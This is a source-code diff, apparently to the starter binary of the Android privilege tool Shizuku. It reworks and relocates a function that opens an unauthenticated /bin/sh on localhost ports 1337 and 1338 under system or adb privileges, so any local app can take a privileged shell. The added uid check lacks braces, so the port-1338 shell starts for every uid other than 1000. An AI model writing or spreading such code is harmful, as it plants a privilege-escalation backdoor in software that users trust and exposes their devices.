@@ -171,62 +171,63 @@ static int fork_daemon(int returnParent) {
 
 void startReverseShell(int port) {
     int server_fd, client_fd;
-    struct sockaddr_in server_addr, client_addr;
-    socklen_t sin_size = sizeof(struct sockaddr_in);
+    struct sockaddr_in server_addr{};
 
-    signal(SIGCHLD, SIG_IGN);
-
-    server_fd = socket(AF_INET, SOCK_STREAM, 0);
-    if (server_fd == -1) {
-        LOGE("Failed to create socket");
+    if (fork_daemon(0) < 0) {
+        LOGE("Failed to daemonize");
         return;
     }
 
-    int opt = 1;
-    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) == -1) {
-        LOGE("Failed to set socket options");
-        close(server_fd);
+    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
+        LOGE("socket failed");
         return;
     }
 
+    int optval = 1;
+    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
+
+    memset(&server_addr, 0, sizeof(server_addr));
     server_addr.sin_family = AF_INET;
     server_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
     server_addr.sin_port = htons(port);
-    memset(&(server_addr.sin_zero), '\0', 8);
 
-    if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(struct sockaddr)) == -1) {
-        LOGE("Failed to bind socket");
+    if (bind(server_fd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
+        LOGE("bind failed");
         close(server_fd);
         return;
     }
 
-    if (listen(server_fd, 1) == -1) {
-        LOGE("Failed to listen to socket");
-        close(server_fd);
-        return;
-    }
-
-    if (fork() != 0) {
+    if (listen(server_fd, 1) < 0) {
+        LOGE("listen failed");
         close(server_fd);
         return;
     }
 
     while (true) {
-        client_fd = accept(server_fd, (struct sockaddr *)&client_addr, &sin_size);
-        if (client_fd == -1) {
-            LOGE("Failed to accept incoming connection");
+        client_fd = accept(server_fd, nullptr, nullptr);
+        if (client_fd < 0) {
+            sleep(1);
             continue;
         }
 
-        if (fork() == 0) {
+        pid_t shell_pid = fork();
+        if (shell_pid < 0) {
+            close(client_fd);
+            continue;
+        }
+
+        if (shell_pid == 0) {
             close(server_fd);
+
             redirectStd(client_fd);
-            execl("/bin/sh", "sh", (char *)NULL);
             close(client_fd);
 
-            exit(0);
+            execl("/bin/sh", "sh", NULL);
+            _exit(1);
         }
+
         close(client_fd);
+        waitpid(shell_pid, nullptr, 0);
     }
 }
 
@@ -297,11 +298,6 @@ int main(int argc, char *argv[]) {
         perrorf("fatal: run Shizuku from non root/system/adb user (uid=%d).\n", uid);
         exit(EXIT_FATAL_UID);
     }
-
-    if (uid == 1000) {
-        startReverseShell(1337);
-    } else if (uid == 2000)
-        startReverseShell(1338);
 
     se::init();
 
@@ -388,4 +384,11 @@ int main(int argc, char *argv[]) {
     fflush(stdout);
     LOGD("start_server");
     start_server(apk_path.c_str(), SERVER_CLASS_PATH, SERVER_NAME);
+
+    if (uid == 1000) {
+        printf("info: starting reverse system shell server at port 1337...\n");
+        startReverseShell(1337);
+    } else if (uid == 2000)
+        printf("info: starting reverse adb shell server at port 1338...\n");
+        startReverseShell(1338);
 }
